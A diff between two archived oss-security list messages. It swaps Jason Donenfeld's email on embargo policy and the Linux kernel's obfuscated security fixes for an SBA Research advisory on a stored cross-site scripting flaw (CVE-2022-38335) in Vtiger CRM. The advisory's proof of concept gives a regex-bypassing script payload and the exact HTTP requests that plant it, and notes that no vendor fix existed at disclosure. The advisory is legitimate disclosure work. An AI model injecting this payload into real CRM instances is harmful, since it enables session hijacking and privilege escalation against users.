@@ -1,111 +1,157 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/05/16/1
-Message-ID: <YoJNtNJXUwLySmmO@zx2c4.com>
-Date: Mon, 16 May 2022 15:12:20 +0200
-From: "Jason A. Donenfeld" <Jason@...c4.com>
-To: Solar Designer <solar@...nwall.com>
-Cc: oss-security@...ts.openwall.com
-Subject: Re: linux-distros list policy and Linux kernel
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/09/27/2
+Message-ID: <216ad4805b88424ebaa6cfcaf23743ac@SATVIEEX03.securityresearch.local>
+Date: Tue, 27 Sep 2022 15:53:17 +0000
+From: SBA - Advisory <advisory@...-research.org>
+To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
+Subject: [SBA-ADV-20220328-01] CVE-2022-38335: Vtiger CRM 7.4.0 or below Stored Cross-Site Scripting
 Content-Type: text/plain; charset=utf-8
 
-Hi Alexander,
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
 
-I think a lot of this depends on what you feel the primary value in
-distros@ is.
+# Vtiger CRM Stored Cross-Site Scripting #
 
-I always thought its primary purpose was to centralize embargoed
-vulnerability reports, using its presence as *the* de facto forum for
-that, in order to receive nearly all embargoed bugs. Then, those bugs
-become subject to the distros@ 14-day disclosure policies. Seen this
-way, distros@ is a mechanism for ensuring that bugs eventually *do*
-become disclosed, rather than languishing in embarrassed vendor
-purgatory forever.
+Link: https://github.com/sbaresearch/advisories/tree/public/2022/SBA-ADV-20220328-01_Vtiger_CRM_Stored_Cross-Site_Scripting
 
-Maybe I'm far off, though, so it'd be interesting to learn if you have a
-different idea of its value.
+## Vulnerability Overview ##
 
-With regards to Linux, your description seems about right:
+Vtiger CRM 7.4.0 or below is prone to a stored cross-site scripting
+vulnerability in the email templates module due to insufficient sanitizing.
 
-On Sun, May 15, 2022 at 04:27:40PM +0000, Solar Designer wrote:
-> For Linux kernel maintainers, it is customary to post a fix technically
-> publicly but without indication of its security relevance, then work on
-> getting it merged into the various trees, and expect that its security
-> relevance wouldn't be clearly indicated publicly for a while.
+* **Identifier**            : SBA-ADV-20220328-01
+* **Type of Vulnerability** : Cross Site Scripting
+* **Software/Product Name** : [Vtiger CRM](https://code.vtiger.com/vtiger/vtigercrm)
+* **Vendor**                : [Vtiger](https://www.vtiger.com/)
+* **Affected Versions**     : <= 7.4.0
+* **Fixed in Version**      : Not yet
+* **CVE ID**                : CVE-2022-38335
+* **CVSS Vector**           : CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N
+* **CVSS Base Score**       : 7.6 (High)
 
-One could argue that all currently existing vulnerabilities are already
-"known" because they exist in code already written, and one simply has
-to search for them... And so writing an obfuscated commit message and
-making it public carries with it the same burden of search to discover
-it, and so it's no more public than the original vulnerability in the
-code was before it was found. But this is utter nonsense.
+## Vendor Description ##
 
-People can and do trawl commit logs looking for obfuscated vuln fixes. I
-cut my teeth doing this nearly every day for some time way back when.
-Maybe they'll pop up on Twitter; maybe they won't. But they're
-definitely being found, traded, exploited, and so forth. The kernel
-isn't some CGI script that's trivially exploitable by a 14 year old
-running VB6. Rather, though it's still not rocket science, if you're
-writing kernel exploits, you can certainly also read commit logs.
+> Vtiger is a PHP based web application that enables businesses to increase
+> sales wins, marketing ROI, and support satisfaction by providing tools for
+> employees and management work more effectively, capture more data, and
+> derive new actionable insights from across the customer lifecycle.
 
-Some commits are more obvious (remember when I experimented with
-including exploit code in commit messages? [1] fun times...), and other
-times they're obscure, but either way the cat is out of the bag at that
-point and people are finding these.
+Source: <https://code.vtiger.com/vtiger/vtigercrm>
 
-So if the point of distros@ is to have integrity as a security mailing
-list, having something to do with some real threat model somehow, then
-just consider vulns with public fixes as public, so that if distros@
-gets a report about a vulnerability with a public fix, it just
-automatically forwards it onto oss-security, as a completely procedural
-non-decision. Maybe spell out in the policy doc that the Linux case is
-no exception, to mitigate misunderstandings. But beyond that, it doesn't
-make sense to sacrifice the integrity of distros@ because a project has
-a different idea of "public" than the rest of the security world.
+## Impact ##
 
-Now, I don't intend to disparage the kernel's security team (of which I
-am a member, though I don't speak for everybody here). The "a bug's a
-bug's a bug" attitude might seem foreign to this list, which gets
-excited about individual vulns, but a lot of kernel developers
-rightfully see this as chickens running around with their heads chopped
-off, because they *know* from real life experience that bugs are rampant
-anyway, and that the line between a security vulnerability and a boring
-bug can be pretty hazy, as new techniques are discovered for exploiting
-new classes of bugs. As Bas told us in this classic post [2]:
+An authenticated attacker with the "Email Templates"-module privilege is able
+to insert JavaScript into email templates, which is triggered when a victim
+views the template.
+In the worst case, the victim's session could be hijacked and the attacker is
+able to perform actions in the victim's context.
+This could lead to privilege escalation if the victim is more privileged than
+the attacker (for example an admin).
 
-> Anyways, both sides of the disclosure fence suffer from one fatal
-> flaw. A flaw that Brad Spengler AKA Spender has been incessantly
-> pointing out for years and it's that bugs don't matter. Bugs are
-> irrelevant. Yet our industry is fatally focused on what is essentially
-> vulnerability masturbation.
+## Vulnerability Description ##
 
-So I think a lot of the kernel's commit message obfuscation and unusual
-disclosure ideas stem from a sort of collective sigh and desire not to
-join the circus of security performers. They'll commit the fix, because
-that's the sensible thing to do from a development perspective and
-doesn't make a difference anyway, as LTS and distro kernels come with
-their own long delays. And they'll talk to you privately under an
-"embargo" for a little bit if you want, so that you don't go berserk
-that they're not "taking seriously" your beautiful vulnerability. (Also
-IIRC, OpenBSD won't even pay lip service to embargoes...) But mostly
-this is designed around that collective sigh, made to minimize drama and
-maximize productivity in actually getting fixes committed and deployed.
+The following code snippet (`./modules/Emails/models/Mailer.php`) shows the
+function which should ensure that JavaScript is removed from the user input:
 
-That all is to say that while I personally would like to have exploit
-code in commit messages -- how's the illustrative test code in, e.g.,
-[3] actually different from the exploit code in, e.g., [1] from a
-code-understanding perspective? Quit hiding stuff! -- I can also
-understand where this collective sigh is coming from.
+```php
+[...]
+public static function getProcessedContent($content) {
+    // remove script tags from whole html content
+    $processedContent = preg_replace('#<script(.*?)>(.*?)</script>#is', '', $content);
+$processedContent = purifyHtmlEventAttributes($processedContent,TRUE);
+    return $processedContent;
+}
+[...]
+```
 
-And anyway, practically speaking, security@...nel.org's disclosure
-deadline is usually something like 7 days, which is pretty short, so for
-people who misread the documentation, at most they'll only be miffed
-about a few days, rather than a few months.
+However, the regex `#<script(.*?)>(.*?)</script>#is` is insufficient for
+sanitizing JavaScript.
 
-So I think maybe your option (0) makes sense? Enforce the policy, which
-has worked well enough for a long while now.
+## Proof of Concept ##
 
-Jason
+If the attacker inserts the payload `<script>alert(1)</script` into an email
+template, the JavaScript code will not be removed, because the regex does not
+work due to the missing `>`.
+The following request demonstrates saving a template containing the malicious
+payload:
 
-[1] https://git.kernel.org/torvalds/c/d114b9fe78c8d
-[2] https://lists.immunityinc.com/pipermail/dailydave/2015-August/000976.html
-[3] https://git.kernel.org/torvalds/c/e3c1c4fd9e6d1
+```http
+POST /index.php HTTP/1.1
+Host: example.org
+Cookie: PHPSESSID=[...]
+[...]
+
+__vtrftk=[...]&module=EmailTemplates&action=Save&record=16&subject=Invitation&systemtemplate=1&templatename=Invite+Users&description=Invite+Users&moduleFields=&modulename=Contacts&templateFields=%24contacts-salutation%24&generalFields=&templatecontent=%3Chtml%3E%0D%0A%3Chead%3E%0D%0A%09%3Ctitle%3E%3C%2Ftitle%3E%0D%0A%3C%2Fhead%3E%0D%0A%3Cbody%3E%0D%0A%3Cscript%3Ealert%281%29%3C%2Fscript%0D%0A%3C%2Fbody%3E%0D%0A%3C%2Fhtml%3E%0D%0A
+```
+
+To load the content of the corresponding template, the following request is
+sent by the victim:
+
+```http
+POST /index.php HTTP/1.1
+Host: example.org
+Cookie: PHPSESSID=[...]
+[...]
+
+__vtrftk=[...]&module=EmailTemplates&action=ShowTemplateContent&mode=getContent&record=16
+```
+
+The server responds with the content that contains the injected JavaScript:
+
+```http
+HTTP/1.1 200 OK
+[...]
+
+{"success":true,"result":{"content":"<html>\r\n<head>\r\n\t<title><\/title>\r\n<\/head>\r\n<body>\r\n<script>alert(1)<\/script\r\n<\/body>\r\n<\/html>\r\n"}}
+```
+
+After that, the HTML content is inserted into the iframe with the id
+`TemplateIFrame`, where the JavaScript is executed within the victim's
+browser.
+
+## Recommended Countermeasures ##
+
+We are not aware of a vendor fix yet. Please contact the vendor.
+
+In other places of the source code, in addition to the
+`purifyHtmlEventAttributes` function, the `purify` function of the class
+`HTMLPurifier` is used to sanitize JavaScript.
+The function `getProcessedContent` should also use `HTMLPurifier` instead of
+the regex.
+
+## Timeline ##
+
+* `2022-03-28`: identified the vulnerability in version 7.4.0
+* `2022-03-28`: initial vendor contact through public address
+* `2022-03-28`: disclosed vulnerability to vendor
+* `2022-04-14`: vendor will look into vulnerability
+* `2022-05-30`: contacted vendor again but received no reply
+* `2022-08-12`: request CVE from MITRE
+* `2022-09-16`: MITRE assigned CVE-2022-38335
+* `2022-09-27`: public disclosure
+
+## References ##
+
+* Vtiger CRM 7.4.0: <https://code.vtiger.com/vtiger/vtigercrm/repository/archive.zip?ref=7.4.0GA>
+
+## Credits ##
+
+* Corinna Rudlstorfer ([SBA Research](https://www.sba-research.org/))
+* Thomas Kostal ([SBA Research](https://www.sba-research.org/))
+* Jakob Pachmann ([SBA Research](https://www.sba-research.org/))
+-----BEGIN PGP SIGNATURE-----
+
+iQIzBAEBCAAdFiEEL9Wp/yZWFD9OpIt6+7iGL1j3dbIFAmMzHGQACgkQ+7iGL1j3
+dbKc/A/7BBIzXVndN5S6HozpRWjNVeG+C9ms7Nje0tA5GNIneOtqL3rzvAyTfnCc
+XL+BR2RS1OGWh33kNv5OqptelOnLw48DJBaxlaNFiXYAP5g+1cSv0pIOyPKE1lOG
+u85ZwsS1WqpXS7TmgXqrEy0u4nampyFxRXWStMMOLjJSWXWQTk9c8PUwPTFYLRFz
+7UgdWgg9VRT1gZ7rknsBm9dOH9giWFVrY5TfinZ9tgVjBj1PLwfKQhgIAH2W8QJB
+91bwJurjqhJcdP9fgM6CQKUdx038amMkRDZOkKzsK2t+M4cI8duP+jag0PLgfcCd
+06U8TaomIpehCbbw0MX2n4xQTftJwubZJDr2k1H3XyJmLv+3hoW2HZP5MJY17jyw
+bPwiFPgxb1Qm55YFyEJscjnZkj6VZUba8bm3yEDAWMuTFaPQcF4ZczQa34fDUbgo
+L5wbmp0L9T06cZbJvQVof52ayHd5JRBopVZ8WVsIYO44lLNcHRLS/YYtHmLJ/1O0
+kzbDofUpeDabmY0rxGJ+M2o6aOAOyUMJhMstcuGL6TbPIo+I7LuBpAv7hMas3i9J
+o1DcvwJCm4Q6ZvS99w7XHY23J4YY+esL3pwserPBKUc38CEuTvXyLHHL7h9BgqKG
+HzNe+3XAxHObXD61j8oJaR8P2zWLD5DpCNe1mAIUKSRqljzUS+E=
+=pFzx
+-----END PGP SIGNATURE-----
